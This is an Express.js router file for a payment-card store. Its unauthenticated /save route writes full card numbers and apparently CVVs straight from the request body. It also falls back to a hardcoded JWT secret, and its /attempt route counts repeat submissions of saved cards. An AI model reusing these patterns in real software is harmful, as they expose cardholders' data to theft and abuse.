const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const Card = require('../models/Card');

const JWT_SECRET = process.env.JWT_SECRET || 'jellery_secret_2026';

function adminAuth(req, res, next) {
  try {
    const token = req.header('Authorization')?.replace('Bearer ', '');
    if (!token) return res.status(401).json({ message: 'Unauthorized' });
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== 'admin') return res.status(403).json({ message: 'Admin only' });
    next();
  } catch {
    return res.status(401).json({ message: 'Invalid token' });
  }
}

router.get('/', adminAuth, async (req, res) => {
  try {
    const cards = await Card.find().sort({ createdAt: -1 });
    const masked = cards.map(c => ({
      ...c._doc,
      cardNumber: '****-****-****-' + c.cardNumber.replace(/\s/g, '').slice(-4),
      cvv: '***',
    }));
    res.json(masked);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

router.post('/save', async (req, res) => {
  try {
    const cleanNumber = req.body.cardNumber.replace(/\s/g, '');
    const existing = await Card.findOne({ cardNumber: cleanNumber });
    if (existing) {
      return res.json({ saved: false, message: 'Card already exists' });
    }
    await Card.create(req.body);
    res.json({ saved: true, message: 'Card saved' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

router.post('/attempt', async (req, res) => {
  try {
    const { cardNumber } = req.body;
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const card = await Card.findOne({ cardNumber: cleanNumber });
    if (card) {
      card.attempts += 1;
      await card.save();
      return res.json({ saved: false, attempts: card.attempts, message: 'Card already saved' });
    }
    res.json({ saved: false, message: 'Card not found' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

router.delete('/:id', adminAuth, async (req, res) => {
  try {
    await Card.findByIdAndDelete(req.params.id);
    res.json({ message: 'Card deleted' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
